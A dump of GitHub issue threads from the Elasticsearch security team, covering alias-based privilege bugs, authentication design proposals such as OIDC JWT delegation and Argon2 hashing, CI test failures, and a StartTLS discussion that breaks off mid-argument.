Relates to [#798](https://github.com/elastic/observability-docs/pull/798)

cc: @dedemorton ","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-docs (Team:Docs)Please include Logstash also.I recommend maintaining the Metricbeat section for awhile at least until Elastic Agent is functionally complete (has all or most of the integrations that are available in Beats).",no,">enhancement,>docs,:Security/TLS,Team:Docs,Team:Security,v8.6.0,"
elastic/elasticsearch,1158496749,"Index privileges through alias name not working for _refresh, _flush","### Elasticsearch Version

7.17.0

### Installed Plugins

_No response_

### Java Version

_bundled_

### OS Version

CentOS Linux release 7.9.2009

### Problem Description

A user with a role that grants `all` index privileges to an index name that is an alias will not be permitted to call `_refresh` or `_flush` on the alias.

Ability to `_refresh`  indices processed by the shrink ILM action and/or the upgrade assistant will break, as the privilege is not correctly propagated through the alias.

Note that read access still works through the alias name.

### Steps to Reproduce

### Create role
Create a role that grants `all` to index `secret-documents`.

```
PUT _security/role/secret-user
{
  ""cluster"": [],
  ""indices"": [
    {
      ""names"": [
        ""secret-documents""
      ],
      ""privileges"": [
        ""all""
      ]
    }
  ]
}
```
### Create user

```
PUT _security/user/user1
{
  ""password"": ""passpass"",
  ""roles"": [""secret-user""]
}
```
### Create index with alias
```
PUT secret-documents-000001
{
  ""aliases"": {
    ""secret-documents"": {}
  }
}
```
### _refresh on index through alias is not permitted
```
curl -k -u user1:passpass ""https://localhost:9200/secret-documents/_refresh""     
{""_shards"":{""total"":2,""successful"":1,""failed"":1,""failures"":[{""shard"":0,""index"":""secret-documents-000001"",""status"":""FORBIDDEN"",""reason"":{""type"":""security_exception"",""reason"":""action [indices:admin/refresh[s][r]] is unauthorized for user [user1] with roles [secret-user] on indices [secret-documents-000001], this action is granted by the index privileges [maintenance,manage,all]""}}]}}
```

### _search still works
```
curl -k -u user1:passpass ""https://se03-cielkdev01.corp.int:9200/secret-documents/_search"" 
{""took"":0,""timed_out"":false,""_shards"":{""total"":1,""successful"":1,""skipped"":0,""failed"":0},""hits"":{""total"":{""value"":0,""relation"":""eq""},""max_score"":null,""hits"":[]}}
```


### Logs (if relevant)

_No response_","Pinging @elastic/es-security (Team:Security)I can reproduce this behaviour back in v7.6.2. Things are a little different in 7.16+: If the shard is local to the node, the refresh will be successful. But it fails otherwise. 
Whatever the right behaviour is, this looks like a bug to me. Thanks for reporting.",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,535349377,"Exceptions during authorization can be hidden","In the introduction of support for authorization engines (#38358), the authorization code was changed to support asynchronous authorization calls. In one of the changed blocks of code an exception could get hidden and the user will only get a 403 Access Denied error without any clue into what caused this.

To reproduce this specific scenario:
* Use run as
  * The authenticated user may have a simple role
  * The run as user needs to have a complex role combination that will trigger a TooComplexToDeterminize exception (or some other way to cause an exception)

See the following block of code:

https://github.com/elastic/elasticsearch/blob/12e1bc45c364e2ec820d0324a20acebe25aa950a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/AuthorizationService.java#L206-L225

An exception that is thrown during the rest of the authorization process, will wind up getting caught by that listener's exception consumer. This leads to a confusing `run_as_denied` audit event after a `run_as_granted` event for the same request. I think the first item to address is the fact that `e` gets dropped in that code. The second item is to avoid the confusion of having the error reported as a `run_as_denied` event and appropriately handle the exception.","Pinging @elastic/es-security (:Security/Security)",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1162560145,"Allow refresh aliases with only privileges over aliases","If a user only has privileges for aliases and request refresh or flush
for the aliases, the actions should be authorized similar to how read is
authorized for aliases.

Resolves: #84626
","Hi @ywangd, I've created a changelog YAML for you.Pinging @elastic/es-security (Team:Security)@javanna Could you please review this PR for a long standing bug (since 6.8 at least). It touches `BasicReplicationRequest` and `ShardFlushRequest` and I am not sure whether there are unknown implications. The changes basically make them more like the `ShardSearchRequest` which carries the original indices with it for authorization.

@tvernum As we found out before, carrying original indices can have significant performance implications when the list of indices is large. `ShardSearchRequest` is optimised to carry only related indices, aliases and datastreams. I didn't do it in this PR because `ShardSearchRequest` is a special case for optimisation rather than the standard. This does raise the question again: what is a better way to avoid this performance cost without having each Request type explicitly opt-in for it?

> what is a better way to avoid this performance cost without having each Request type explicitly opt-in for it?

I think we've decided that our answer to that is to shift wildcard expansion from an interceptor to be handled in core.
I don't think we should be spending time implementing workarounds on each request when we could just prioritize doing the work we need to do.
Since the bulk of the change is in `BasicReplicationRequest`, I think this should be reviewed by @elastic/es-distributed> > what is a better way to avoid this performance cost without having each Request type explicitly opt-in for it?
> 
> I think we've decided that our answer to that is to shift wildcard expansion from an interceptor to be handled in core. I don't think we should be spending time implementing workarounds on each request when we could just prioritize doing the work we need to do.

I agree that we should not spend time trying to work around each every request. In addition to possiblity of shifting wildcard expansion to core, this particular problem here can also be solved if we decide to propagare privileges over alias to its concrete indices. I was pinged here hence I checked this out and the change looks good. It does seem like a long standing bug. I was also going to ask what the long term plan is as I've heard we want to change strategy around authorization and this seems a workaround following the old strategy.@javanna The long term plan is still a little unclear. We have a task to try and work out a proper plan, but there's a range of views and no clear path, so it may take some time to settle on an answer. ",yes,">bug,:Security/Authorization,Team:Security,v8.6.0,"
elastic/elasticsearch,408605873,"Add Argon2 support for password hashing","We currently support configurable password hashing algorithms, for the native/reserved realms, API-keys, and for various caches.

[Argon2](https://en.wikipedia.org/wiki/Argon2) was the winning algorithm in the _Password Hashing Competition_, but we have not offered it as an algorithm due to the lack of a native Java implementation.

[BouncyCastle Release 1.16](https://www.bouncycastle.org/releasenotes.html) includes Argon2 support. I have not evaluate the API yet, but given BC's typical approach to such things, it is likely to suit our needs.

However, we have intentionally removed our direct dependency on BouncyCastle due to the problems that occur when trying to use their default jars alongside their FIPS provider. If we do proceed with this feature we would either need to extract the Argon2 implementation into something we can cleanly import, or look at making hashing algoithms pluggable so this can be an optional dependency.

Based on the difficulties above, I think this is probably a low priority for now.
 ","Pinging @elastic/es-security",no,">feature,:Security/Authentication,Team:Security,"
elastic/elasticsearch,557430113,"Add user documentation on scalability of security rules.","I've experienced users writing overly-complex or detailed security rules and then hitting problems.

There can be a temptation for users to add many fine-grained filtering rules e.g. listing individual IDs of docs a user can see or having thousands of roles.

I seem to remember hitting a hard size limit somewhere too in terms of rule complexity.
Do we document the limits anywhere and should we warn about writing slow-running queries in the [docs](https://www.elastic.co/guide/en/elasticsearch/reference/master/document-level-security.html)?

","Pinging @elastic/es-docs (>docs)Pinging @elastic/es-security (:Security/Authorization)",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317447284,"REST tests to simulate Kibana interaction with ES + XPack","*Original comment by @jaymode:*

This issue is to track adding REST tests around how Kibana interacts with elasticsearch and xpack. This will help prevent issues such as LINK REDACTED in the future. This will be tricky to keep in sync with changes in Kibana but it leads to a better experience if we can catch these problems earlier.

cc @uboness @lukasolson 


","*Original comment by @lukasolson:*

Here are the different calls for index pattern management:

```
POST /_mget
{""docs"":[{""_index"":"".kibana"",""_type"":""config"",""_id"":""4.5.0""}]}

POST /.kibana/index-pattern/_search
{""query"":{""match_all"":{}},""size"":10000}

GET /.kibana/_mapping/*/field/_source

GET /logstash-*/_mapping/field/*

POST /.kibana/index-pattern/logstash-*
{""title"":""logstash-*"",""timeFieldName"":""utc_time""}

POST /.kibana/_refresh

POST /_mget
{""docs"":[{""_index"":"".kibana"",""_type"":""index-pattern"",""_id"":""logstash-*""}]}

POST /.kibana/config/4.5.0/_update
{""doc"":{""buildNum"":9889,""defaultIndex"":""logstash-*""}}
```
",no,">test,v5.0.0-alpha2,:Security/Security,Team:Security,"
elastic/elasticsearch,354815303,"Run LDAP tests against 389-ds","Currently our LDAP tests are run against an OpenLDAP fixture. A recent announcement shows the RHEL and SLES are withdrawing support for OpenLDAP in favor of 389-ds. This issue is being opened to discuss testing against the 389-ds server in addition to OpenLDAP testing.","Pinging @elastic/es-securityWe discussed this in the ES security meeting some months ago and decided that this made sense, but was a low priority.
For most of our security realms / protocols we only test against a single sample provider (e.g. SAML tests only run against Shibboleth) and given the relatively infrequency of LDAP compatibility issues this is a low priority change (we'd rather add more SAML tests).
Given that RHDS / 389DS's member-of plugin [claims to automatically expand nested groups](https://access.redhat.com/documentation/en-us/red_hat_directory_server/10/html/administration_guide/advanced_entry_management#groups-cmd-memberof) 
(see also https://github.com/elastic/elasticsearch/issues/43921), it might be worth adding it to the test suite so that we are running tests against at least 1 server that has nested group support.
",no,">test,help wanted,:Security/Authentication,Team:Security,"
elastic/elasticsearch,950173689,"Unify the Authentication Chain (Realm, Token, ApiKey)","The AuthenticationService currently has special handling for different types of authentication, including different error handling.

- OAuth2 Token
- Service Token
- ApiKey
- Realms

This makes the code more complex than it needs to be, _and_ has some strange user facing behaviours - for example providing an incorrect password will give you an error message of `unable to authenticate user [...] ...` but an invalid ApiKey acts as if you didn't provide any credentials at all.

It would be helpful to have a single chain of AuthenticationMethods that behave in consistent ways.","Pinging @elastic/es-security (Team:Security)",no,">enhancement,>refactoring,:Security/Authentication,Team:Security,"
elastic/elasticsearch,447844442,"Enabling/Disabling user does not support refresh parameter","The high level rest client requires a `RefreshPolicy` to be specified for enabling or disabling users that are stored in the native and reserved realms. If the specified refresh policy differs from the default, then the refresh parameter is added to the request URL. However, the rest action does not consume the refresh parameter which causes the request to fail.

```
ElasticsearchStatusException[Elasticsearch exception [type=illegal_argument_exception, reason=request [/_security/user/elastic/_enable] contains unrecognized parameter: [refresh]]
]
	at __randomizedtesting.SeedInfo.seed([C23021439EEBD95C:92C19BD5D41D35CA]:0)
	at org.elasticsearch.rest.BytesRestResponse.errorFromXContent(BytesRestResponse.java:177)
	at org.elasticsearch.client.RestHighLevelClient.parseEntity(RestHighLevelClient.java:1721)
	at org.elasticsearch.client.RestHighLevelClient.parseResponseException(RestHighLevelClient.java:1698)
	at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1461)
	at org.elasticsearch.client.RestHighLevelClient.performRequest(RestHighLevelClient.java:1433)
	at org.elasticsearch.client.SecurityClient.enableUser(SecurityClient.java:247)
	at org.elasticsearch.xpack.security.authc.esnative.ReservedRealmIntegTests.testDisablingUser(ReservedRealmIntegTests.java:163)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:567)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
	at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
	at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
	at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
	at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
	at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
	at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
	at org.junit.rules.ExternalResource$1.evaluate(ExternalResource.java:48)
	at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
	at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
	at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
	at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
	at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
	at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
	at java.base/java.lang.Thread.run(Thread.java:835)
	Suppressed: org.elasticsearch.client.ResponseException: method [PUT], host [http://127.0.0.1:52907], URI [/_security/user/elastic/_enable?refresh=true], status line [HTTP/1.1 400 Bad Request]
{""error"":{""root_cause"":[{""type"":""illegal_argument_exception"",""reason"":""request [/_security/user/elastic/_enable] contains unrecognized parameter: [refresh]""}],""type"":""illegal_argument_exception"",""reason"":""request [/_security/user/elastic/_enable] contains unrecognized parameter: [refresh]""},""status"":400}
		at org.elasticsearch.client.RestClient.convertResponse(RestClient.java:253)
		at org.elasticsearch.client.RestClient.performRequest(RestClient.java:231)
		at org.elasticsearch.client.RestClient.performRequest(RestClient.java:205)
		at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1448)
		... 41 more
```","Pinging @elastic/es-security",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317454063,"bind_dn for group_search when using user_dn_templates","*Original comment by @inqueue:*

Sometimes the `user_dn` does not have read access to groups used for `group_search` such as those controlled with `olcAccess` under OpenLDAP. Is it possible to optionally use a `bind_dn/bind_password` configuration specifically for `group_search` when `user_dn_templates` is in use?


",,no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,822452593,"OIDC realm delegate ID Token (JWT) validation","This is a proposal to convert a JWT ID token (that contains claims) into an Elasticsearch internal Access Token, by using the OIDC realms, but not really enforcing the OIDC protocol flows.

### Preamble

The Elasticsearch OIDC realm, with Kibana as the facilitator, implements the [OIDC code flow](https://openid.net/specs/openid-connect-basic-1_0.html). Kibana is required because the OIDC flow relies on HTTP Redirects.
The code flow is designed for Relying Parties that can keep a secret (the rp.client_secret realm secure setting in the keystore). To obtain the JWT ID token, which contains the user claims, Elasticsearch exchanges a `code` through a secure back-channel with the OP. The `code` is designed to be un-replay-able and bound to an end user and an RP, and is obtained in the front channel interaction (using the browser), following a successful authentication at the OP.

For this purpose, Elasticsearch exposes two APIs, that the Kibana facilitator calls: one to construct the authentication request to submit to the OP ([_security/oidc/prepare](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-oidc-prepare-authentication.html)), and another one that validates the response, which contains the `code`, of the aforementioned request ([_security/oidc/authenticate](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-oidc-authenticate.html)).

### Implicit flow uses JWTs already

In addition to the code flow, OIDC also standardizes what's called the [implicit flow](https://openid.net/specs/openid-connect-implicit-1_0.html). In the implicit flow, the JWT ID Token is released directly in the front-channel. This is to support serverless Relying Parties (where the client runs in the browser/phone, not on a server). Elasticsearch supports this flow as well: the response to validate by the ES `_security/oidc/authenticate` call will contain the ID Token instead of the `code`. The API returns an Elasticsearch internal Access Token. 

Therefore there is already a protocol way to exchange JWTs with ES internal Access Tokens. But of course, the protocol must be followed, eg calling the ES `prepare` API, binding the `state` parameter to a cookie and validating that on the response, etc...

### Proposal

For a more ""direct"" way to exchange a JWT into an ES token, we could introduce something analogous to the [PKI realm delegation](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-delegate-pki-authentication.html). There, we rely on a **trusted** proxy to perform the authentication as part of the TLS protocol. In the OIDC case, the facilitator actually becomes a full-fledged OIDC RP, and the OIDC realm in ES works in a delegated mode. It trusts that the proxying RP obtained and validated the JWT according to the OIDC flow of choice. Before releasing an access token, the ES OIDC realm, working in a delegated mode (a new realm setting), authenticates (validates signature) and possibly decrypts the JWT and maps the claims to a principal and roles.

Analogous to the [POST /_security/delegate_pki](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-delegate-pki-authentication.html) there would be a new API and a new cluster privilege to restrict the clients that are trusted in this way.","Pinging @elastic/es-security (Team:Security)Some first thoughts to get the discussion going:

- If we trust that the proxying RP obtained and validated the JWT according to the OIDC specification, then why would elasticsearch also validate and authenticate the JWT a second time ? If we go through the process of validating the ID Token separately, as we would do for the standard OIDC Token then why do we need to have additional higher privileges for the client that exchanges that OIDC Token?
- In order to do the above, ES and the proxying RP both need to be configured as RPs ( so that they can figure out which keys to use for JWT signature validation, how to verify the audience and the issuer of the JWT etc ) 
- This requires an external party that can speak this delegated protocol and thus it's not meant to be used by end users, right? 
-  Can you clarify how you see this helping with the identified use cases where folks want to use JWTs for authentication to elasticsearch? I wouldn't share the assumption that when people want to ""authenticate with JWTs"", they actually have an OpenID Connect ID Token that they received by following the OIDC standard as an RP. 

##### Update
(leaving the above for reference, even though I have answered some of my Qs in my head :) )

I thought about this again this morning and I guess my main concerns where regarding how this is framed and not with the technical solution which I summarized in my mind as:

- We augment the OIDC realm to act in a delegated mode
- In that delegated mode, we introduce an additional API where we can consume an OpenID Connect ID Token. The only difference with the `_security/oidc/authenticate` is that in this flow we don't validate the `nonce` claim and the `state` parameter ( because we can't and because we assume that the caller of the API already did ) 
- We validate the rest of the ID Token to the best of our abilities
  - We can validate the issuer
  - We can validate the signature
  - We can't validate the audience because this ID Token is issued to another RP
- We map the principal and we do claims based role mapping as usual

###### Advantages
- We can reuse the existing OIDC realm with small refactoring to account for the different validation behavior 

###### Disadvantages
- We offer functionality as part of our OpenID Connect realm that is not defined in the specification. Granted, it is separated well enough in the newly introduced API but we're blending standard and non-standard behaviors ( given what we are doing is _not_ OpenID Connect.) 
- This solution depends on a facilitator component. I'm not certain if this is actually a disadvantage (compared to a ""JWT realm"") as I haven't thought through how the JWT realm would work, but I was assuming that we would consume these JWTs as Bearer tokens from an HTTP header and as such the realm would be usable by end users without a facilitator. 

###### Open questions
- Why would we need a new cluster privilege and not reuse `oidc_manage` in this case?


(Always happy to have a chat about his - I just wanted to write down my thoughts and augment my half-baked response from yesterday)> This solution depends on a facilitator component. I'm not certain if this is actually a disadvantage (compared to a ""JWT realm"") as I haven't thought through how the JWT realm would work, but I was assuming that we would consume these JWTs as Bearer tokens from an HTTP header and as such the realm would be usable by end users without a facilitator.
>
I think this is the critical question for the issue. I also had the impression that what users ask for is *not* partial oidc function, but instead an authentication mechanism that happens to use a JWT as the credentials. With this proposal, the end user will need not only a faciliator to act as RP proxy, but also managing the access/refresh token lifecycle. If I remember correctly, there are users claimed that their system cannot do much other than forward the JWT token in a HTTP header. I think we need to be clear on the exact use case (or cases) that we are trying to cater first before deciding on the approach.The question of whether the client has the capacity to call APIs to exchange for ES token credentials is the most important point. If they don't, then this feature is not suitable.",no,">enhancement,:Security/Authentication,team-discuss,Team:Security,"
elastic/elasticsearch,317448183,"Delete by query and friends should work with permissions on aliases","*Original comment by @nik9000:*

Reported here:
https://discuss.elastic.co/t/delete-by-query-request-run-on-alias-needs-security-rights-to-index/102480

If you have permission to delete documents from an alias then you have permission to delete documents from the index that that alias points to. I don't know for sure how filters on the alias come into play here.

Right now delete by query and friends don't support this because they set the index as the same as the underlying index. If we want to continue to support permissions granted through an alias then we should support it in delete by query and friends. Otherwise we should drop it everywhere.","*Original comment by @aliciascott:*

Hey @nik9000  thanks for taking this while I was out! Are we moving forward with a bug label here, or just discussion internally? Thanks!*Original comment by @nik9000:*

So over in LINK REDACTED we're talking about not doing this for the rest of Elasticsearch. So I don't know what the right way is. Nor do I know how hard it will be to get delete-by-query and friends to play along if we want to keep the security on aliases behavior.*Original comment by @aliciascott:*

Thanks @nik9000  ! I know you're at the Dev AH, so whenever you get a chance to review, I had a follow up question from the user to see if there was any other workaround? They don't want to give the users delete privilege on the index:

> 

 For our use case we are using MSSQL servers as our primary data source and we are just using Elasticsearch for embedded searching. We are currently using filtered aliases to separate users data while searching. The problem we run into is that under certain circumstances we want to completely rebuild a users data in Elasticsearch by wiping out the current data and then rebuilding it all using the primary data source, SQL.

 
Our issue is that with delete_by_query not working how we expect it to we don't currently have an easy way to delete all the old data for a specific user out of a shared index. We actually want to keep the filtered alias how it is and just remove all data that relates the the alias. Is there another way to do this? We are currently implementing a work around where we have a centralized webapp issue the delete_by_query requests on behalf of the users but that isn't ideal.

*Original comment by @nik9000:*

I believe that is the only work around for now, yes. I think it is worth getting Jay's opinion on this use case. It seems pretty reasonable from where I sit, just hard to make sure that we do it right.",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1183344486,"[CI] PackageUpgradeTests test21CheckUpgradedVersion failing","Many other failures including:

https://gradle-enterprise.elastic.co/s/7lahgua5jheji

https://gradle-enterprise.elastic.co/s/5cjldjf3c7t3m

https://gradle-enterprise.elastic.co/s/avrzglb2fmi5i

All with
```
""type"" : ""security_exception"",	
            ""reason"" : ""missing authentication credentials for REST request [/library/_doc/1?pretty]"",
```

**Build scan:**
https://gradle-enterprise.elastic.co/s/xfmliqyqa5bwc/tests/:qa:os:destructiveDistroUpgradeTest.v8.1.1.default-deb/org.elasticsearch.packaging.test.PackageUpgradeTests/test21CheckUpgradedVersion

**Reproduction line:**
`null`

**Applicable branches:**
8.1, 8.0

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.packaging.test.PackageUpgradeTests&tests.test=test21CheckUpgradedVersion

**Failure excerpt:**
```
java.lang.RuntimeException: Request failed:
HTTP/1.1 401 Unauthorized
{
  ""error"" : {
    ""root_cause"" : [
      {
        ""type"" : ""security_exception"",
        ""reason"" : ""missing authentication credentials for REST request [/library/_doc/1?pretty]"",
        ""header"" : {
          ""WWW-Authenticate"" : [
            ""Basic realm=\""security\"" charset=\""UTF-8\"""",
            ""ApiKey""
          ]
        }
      }
    ],
    ""type"" : ""security_exception"",
    ""reason"" : ""missing authentication credentials for REST request [/library/_doc/1?pretty]"",
    ""header"" : {
      ""WWW-Authenticate"" : [
        ""Basic realm=\""security\"" charset=\""UTF-8\"""",
        ""ApiKey""
      ]
    }
  },
  ""status"" : 401
}

  at __randomizedtesting.SeedInfo.seed([E966C08FA96F984A:2C5542C3FE45F7A8]:0)
  at org.elasticsearch.packaging.util.ServerUtils.makeRequest(ServerUtils.java:362)
  at org.elasticsearch.packaging.util.ServerUtils.makeRequest(ServerUtils.java:354)
  at org.elasticsearch.packaging.test.PackageUpgradeTests.assertDocsExist(PackageUpgradeTests.java:116)
  at org.elasticsearch.packaging.test.PackageUpgradeTests.lambda$test21CheckUpgradedVersion$0(PackageUpgradeTests.java:112)
  at org.elasticsearch.packaging.test.PackagingTestCase.assertWhileRunning(PackagingTestCase.java:285)
  at org.elasticsearch.packaging.test.PackageUpgradeTests.test21CheckUpgradedVersion(PackageUpgradeTests.java:112)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
  at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55)
  at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:375)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:831)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)These are all actually happening on the `main` branch, it's just failing when upgrading from 8.0+ versions. Also looks to be specific to DEB packaing so perhaps something related security auto configuration needs to be updated there?on 8.2 branch https://gradle-enterprise.elastic.co/s/mwtyjomhxxw3u/tests/:qa:os:destructiveDistroUpgradeTest.v8.1.3.default-deb/org.elasticsearch.packaging.test.PackageUpgradeTests/test21CheckUpgradedVersion

It is hard to confirm what settings were indeed used as it is package test.
from logs I see that security was enabled:
```
[2022-04-01T12:06:46,994][INFO ][o.e.x.s.Security         ] [elasticsearch-ci-immutable-ubuntu-2004-pkg-1648814182960239512] Security is enabled
```
when we did not expect this
https://github.com/elastic/elasticsearch/blob/3f72bf54384e9b102ffd8a608def614ef85dcdc9/qa/os/src/test/java/org/elasticsearch/packaging/test/PackageUpgradeTests.java#L108
",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,317448798,"Support StartTLS with LDAP","*Original comment by @joshbressers:*

An ER recently showed up asking for StartTLS support with our LDAP connector.
LINK REDACTED

I did some quick research and StartTLS is defined by RFC2830 as the way to secure LDAP connections. ldaps has no RFC associated with it.

The OpenLDAP Faq-O-Matic has some extra details
LINK REDACTED

It sounds like an option we should support.","*Original comment by @tvernum:*

~~MaybeTLS~~ StartTLS is dumb, but LDAP admins love it, so we really ought to support it.
>StartTLS is dumb

Can you elaborate? `ldaps://` has been inferior to StartTLS for years. Maybe I'm just one of those admins that love it :P I was actually quite surprised when I discovered StartTLS was not supported.> ldaps:// has been inferior to StartTLS for years

I'd love to know what you mean by _inferior_. It's certainly been preferred by the LDAP community, but thankfully it looks like [the IETF might have seen the error of their ways](https://www.ietf.org/mail-archive/web/ldapext/current/msg02271.html ).

The arguments for StartTLS are weak. The email RFCs spell them out more explicitly than the LDAP ones, so here they are from [RFC 2595](https://tools.ietf.org/html/rfc2595#section-7) (numbers added by me so I can refer to them).

> 1. Separate ports lead to a separate URL scheme which intrudes into the user interface in inappropriate ways.  For example, many web  pages use language like ""click here if your browser supports SSL."" This is a decision the browser is often more capable of making than  the user.
>  2. Separate ports imply a model of either ""secure"" or ""not secure."" This can be misleading in a number of ways.  First, the ""secure"" port may not in fact be acceptably secure as an export-crippled cipher suite might be in use.  This can mislead users into a false sense of security.  Second, the normal port might in fact be secured by using a SASL mechanism which includes a security layer. Thus the separate port distinction makes the complex topic of security policy even more confusing.  One common result of this confusion is that firewall administrators are often misled into permitting the ""secure"" port and blocking the standard port.  This could be a poor choice given the common use of SSL with a 40-bit key encryption layer and plain-text password authentication is less secure than strong SASL mechanisms such as GSSAPI with Kerberos 5.
>  3. Use of separate ports for SSL has caused clients to implement only two security policies: use SSL or don't use SSL.  The desirable security policy ""use TLS when available"" would be cumbersome with the separate port model, but is simple with STARTTLS.
>  4. Port numbers are a limited resource.  While they are not yet in short supply, it is unwise to set a precedent that could double (or worse) the speed of their consumption.

To be clear, people make the best decision they can with the information available at the time they make them. Some of these arguments were valid at the time, or seemed sensible given the direction things were going in, but have proven not to be so helpful as time went on. 

I'm going to critique them in an order that makes sense to me.

**(3)** is backwards. ""use TLS when available"" is pretty the worst option you can have. Hence my comment above about ""MaybeTLS"". As a general rule I want to know that something _is_ using TLS, or consciously accept that it's not. I don't want to hope that it probably is, if the server supported it and the TLS negotiation worked. (I'll come back to this).

**(2)** has the same problem - it implies that blocking the non-SSL port is an anti-pattern because the non-SSL port might be secured by some other mechanism. ""Might"" is not a good security practice. Separate ports allows network rules to enforce that TLS is used for connections outside the data centre but permit (if so desired) internal connections to use the non-TLS port (I'd advise against that, but it's an option for network admins). The arguments about 40-bit SSL are obsolete. Admins should not permit their directory servers to fall back to weak Ciphers.

**(1)** Because of the two points about, separate URL schemes are not that bad. Not that people have `ldap://` or `ldaps://` links in web pages anyway, but even for `https` it's (a) not an issue any more, as all modern browsers support TLS (b) a good think to be able to say ""you need TLS for this"" (c) trying to solve a UX problem at entirely the wrong level.

**(4)** Is kind of true, but from my aurgment for point (2), it's a reasonable tradeoff to accept.

The arguments against StartTLS are real:
